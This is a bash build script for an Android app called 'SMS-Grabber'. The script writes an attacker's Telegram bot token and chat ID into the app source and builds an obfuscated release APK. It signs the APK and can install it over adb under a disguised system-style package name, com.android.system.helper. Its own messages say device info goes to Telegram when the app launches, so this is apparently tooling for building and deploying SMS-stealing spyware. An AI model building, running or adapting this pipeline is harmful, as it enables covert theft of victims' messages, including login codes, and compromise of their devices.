#!/bin/bash

# ============================================================
# SMS-Grabber Build Script
# Builds, obfuscates, and signs the APK
# ============================================================

set -e

# ========== Configuration ==========
PROJECT_DIR="."
APK_OUTPUT="app/build/outputs/apk/release"
KEYSTORE="smsgrabber.keystore"
KEY_ALIAS="smsgrabber"
KEY_PASS="android123"
VALIDITY_DAYS="10000"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
NC='\033[0m'

# ========== Functions ==========

banner() {
    clear
    echo -e "${RED}"
    echo "  ╔══════════════════════════════════════════╗"
    echo "  ║          SMS-Grabber Builder             ║"
    echo "  ║       Android APK Generator v1.0         ║"
    echo "  ╚══════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
}

check_dependencies() {
    echo -e "${CYAN}[*] Checking dependencies...${NC}"

    # Check Java
    if ! command -v java &>/dev/null; then
        echo -e "${RED}[!] Java JDK 17+ is required. Please install it first.${NC}"
        exit 1
    fi

    JAVA_VER=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}' | cut -d'.' -f1)
    echo -e "    ${GREEN}✔${NC} Java version: ${JAVA_VER}"

    # Check Android SDK
    if [ -z "$ANDROID_HOME" ] && [ -z "$ANDROID_SDK_ROOT" ]; then
        echo -e "${YELLOW}[!] ANDROID_HOME not set. Trying common paths...${NC}"
        if [ -d "$HOME/Android/Sdk" ]; then
            export ANDROID_HOME="$HOME/Android/Sdk"
        elif [ -d "/usr/local/lib/android/sdk" ]; then
            export ANDROID_HOME="/usr/local/lib/android/sdk"
        fi
    fi
    echo -e "    ${GREEN}✔${NC} ANDROID_HOME: ${ANDROID_HOME:-not set}"

    echo -e "${GREEN}[✓] All dependencies OK${NC}"
    echo ""
}

configure_telegram() {
    echo -e "${CYAN}[*] Configure Telegram Bot...${NC}"

    TELEGRAM_FILE="$PROJECT_DIR/app/src/main/java/com/smsgrabber/TelegramApi.kt"

    if [ ! -f "$TELEGRAM_FILE" ]; then
        echo -e "${RED}[!] TelegramApi.kt not found at: $TELEGRAM_FILE${NC}"
        exit 1
    fi

    if grep -q "YOUR_BOT_TOKEN_HERE" "$TELEGRAM_FILE"; then
        echo -ne "${YELLOW}[?] Enter your Telegram Bot Token: ${NC}"
        read -r BOT_TOKEN

        if [ -z "$BOT_TOKEN" ]; then
            echo -e "${RED}[!] Bot Token cannot be empty!${NC}"
            exit 1
        fi

        echo -ne "${YELLOW}[?] Enter your Telegram Chat ID: ${NC}"
        read -r CHAT_ID

        if [ -z "$CHAT_ID" ]; then
            echo -e "${RED}[!] Chat ID cannot be empty!${NC}"
            exit 1
        fi

        # Replace placeholders
        if [[ "$OSTYPE" == "darwin"* ]]; then
            sed -i '' "s/YOUR_BOT_TOKEN_HERE/$BOT_TOKEN/" "$TELEGRAM_FILE"
            sed -i '' "s/YOUR_CHAT_ID_HERE/$CHAT_ID/" "$TELEGRAM_FILE"
        else
            sed -i "s/YOUR_BOT_TOKEN_HERE/$BOT_TOKEN/" "$TELEGRAM_FILE"
            sed -i "s/YOUR_CHAT_ID_HERE/$CHAT_ID/" "$TELEGRAM_FILE"
        fi

        echo -e "${GREEN}[✓] Telegram configured successfully${NC}"
    else
        echo -e "${GREEN}[✓] Telegram already configured${NC}"
    fi
    echo ""
}

generate_keystore() {
    if [ ! -f "$KEYSTORE" ]; then
        echo -e "${CYAN}[*] Generating signing keystore...${NC}"
        keytool -genkey -v \
            -keystore "$KEYSTORE" \
            -alias "$KEY_ALIAS" \
            -keyalg RSA \
            -keysize 2048 \
            -validity "$VALIDITY_DAYS" \
            -storepass "$KEY_PASS" \
            -keypass "$KEY_PASS" \
            -dname "CN=SMS-Grabber, OU=Security, O=SMS-Grabber, L=Unknown, S=Unknown, C=US" \
            2>/dev/null
        echo -e "${GREEN}[✓] Keystore created: $KEYSTORE${NC}"
    else
        echo -e "${GREEN}[✓] Keystore already exists: $KEYSTORE${NC}"
    fi
    echo ""
}

clean_build() {
    echo -e "${CYAN}[*] Cleaning previous builds...${NC}"
    rm -rf app/build/
    rm -f smsgrabber-signed.apk smsgrabber-unsigned.apk
    echo -e "${GREEN}[✓] Cleaned${NC}"
    echo ""
}

build_apk() {
    echo -e "${CYAN}[*] Building APK (Release + ProGuard)...${NC}"
    echo ""

    # Make gradlew executable
    if [ -f "./gradlew" ]; then
        chmod +x ./gradlew
        ./gradlew clean assembleRelease --no-daemon 2>&1 | while IFS= read -r line; do
            echo -e "    ${BLUE}│${NC} $line"
        done
    else
        echo -e "${YELLOW}[!] gradlew not found. Checking for system Gradle...${NC}"
        if command -v gradle &>/dev/null; then
            gradle clean assembleRelease --no-daemon
        else
            echo -e "${RED}[!] No Gradle found. Please install Gradle or generate gradlew.${NC}"
            exit 1
        fi
    fi

    echo ""

    UNSIGNED_APK="$PROJECT_DIR/$APK_OUTPUT/app-release-unsigned.apk"

    if [ -f "$UNSIGNED_APK" ]; then
        echo -e "${GREEN}[✓] APK built successfully${NC}"
        cp "$UNSIGNED_APK" ./smsgrabber-unsigned.apk
    else
        echo -e "${YELLOW}[!] Release APK not found. Checking debug...${NC}"
        DEBUG_APK="app/build/outputs/apk/debug/app-debug.apk"
        if [ -f "$DEBUG_APK" ]; then
            echo -e "${GREEN}[✓] Debug APK found${NC}"
            cp "$DEBUG_APK" ./smsgrabber-unsigned.apk
        else
            echo -e "${RED}[!] Build failed - no APK found${NC}"
            exit 1
        fi
    fi
    echo ""
}

sign_apk() {
    echo -e "${CYAN}[*] Signing APK...${NC}"

    INPUT_APK="smsgrabber-unsigned.apk"
    OUTPUT_APK="smsgrabber-signed.apk"

    if command -v apksigner &>/dev/null; then
        echo -e "    Using: apksigner"
        apksigner sign \
            --ks "$KEYSTORE" \
            --ks-key-alias "$KEY_ALIAS" \
            --ks-pass "pass:$KEY_PASS" \
            --key-pass "pass:$KEY_PASS" \
            --out "$OUTPUT_APK" \
            "$INPUT_APK" 2>/dev/null

        if apksigner verify "$OUTPUT_APK" &>/dev/null; then
            echo -e "${GREEN}[✓] APK signed & verified: $OUTPUT_APK${NC}"
        else
            echo -e "${RED}[!] Signature verification failed${NC}"
        fi

    elif command -v jarsigner &>/dev/null; then
        echo -e "    Using: jarsigner"
        jarsigner -verbose \
            -sigalg SHA256withRSA \
            -digestalg SHA-256 \
            -keystore "$KEYSTORE" \
            -storepass "$KEY_PASS" \
            -keypass "$KEY_PASS" \
            "$INPUT_APK" \
            "$KEY_ALIAS" 2>/dev/null

        # Zip align
        if command -v zipalign &>/dev/null; then
            zipalign -v 4 "$INPUT_APK" "$OUTPUT_APK" 2>/dev/null
        else
            cp "$INPUT_APK" "$OUTPUT_APK"
        fi
        echo -e "${GREEN}[✓] APK signed: $OUTPUT_APK${NC}"

    else
        echo -e "${RED}[!] No signing tool found (apksigner or jarsigner)${NC}"
        cp "$INPUT_APK" "$OUTPUT_APK"
        echo -e "${YELLOW}[!] Copied unsigned APK as: $OUTPUT_APK${NC}"
    fi
    echo ""
}

install_apk() {
    if command -v adb &>/dev/null; then
        DEVICES=$(adb devices 2>/dev/null | grep -v "List" | grep "device$" | wc -l)
        if [ "$DEVICES" -gt 0 ]; then
            echo ""
            echo -e "${YELLOW}╔══════════════════════════════════════════╗${NC}"
            echo -e "${YELLOW}║  Device detected!                       ║${NC}"
            echo -e "${YELLOW}╚══════════════════════════════════════════╝${NC}"
            adb devices | grep "device$"
            echo ""
            echo -ne "${YELLOW}[?] Install on connected device? [y/N]: ${NC}"
            read -r INSTALL

            if [ "$INSTALL" = "y" ] || [ "$INSTALL" = "Y" ]; then
                echo -e "${CYAN}[*] Installing APK...${NC}"
                adb install -r smsgrabber-signed.apk
                echo -e "${GREEN}[✓] Installed successfully${NC}"

                echo -e "${CYAN}[*] Launching app...${NC}"
                adb shell am start -n com.android.system.helper/com.smsgrabber.MainActivity 2>/dev/null || true
                echo -e "${GREEN}[✓] App launched (check Telegram for device info)${NC}"
            fi
        fi
    fi
}

summary() {
    APK_SIZE="N/A"
    APK_MD5="N/A"

    if [ -f "smsgrabber-signed.apk" ]; then
        APK_SIZE=$(du -h smsgrabber-signed.apk | cut -f1)
        if command -v md5sum &>/dev/null; then
            APK_MD5=$(md5sum smsgrabber-signed.apk | cut -c1-32)
        elif command -v md5 &>/dev/null; then
            APK_MD5=$(md5 -q smsgrabber-signed.apk)
        fi
    fi

    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║          BUILD COMPLETE!                 ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║                                          ║${NC}"
    echo -e "${GREEN}║  📦 APK: smsgrabber-signed.apk           ║${NC}"
    echo -e "${GREEN}║  📏 Size: $APK_SIZE                          ║${NC}"
    echo -e "${GREEN}║  🔑 MD5:  $APK_MD5  ║${NC}"
    echo -e "${GREEN}║                                          ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║  📲 Transfer:                            ║${NC}"
    echo -e "${GREEN}║     adb install smsgrabber-signed.apk    ║${NC}"
    echo -e "${GREEN}║     scp smsgrabber-signed.apk user@host: ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
    echo ""
}

# ========== Main ==========

main() {
    banner
    check_dependencies
    configure_telegram
    generate_keystore
    clean_build
    build_apk
    sign_apk
    install_apk
    summary

    echo -e "${GREEN}[✓] Done! Check your Telegram for device info when app launches.${NC}"
}

main "$@"
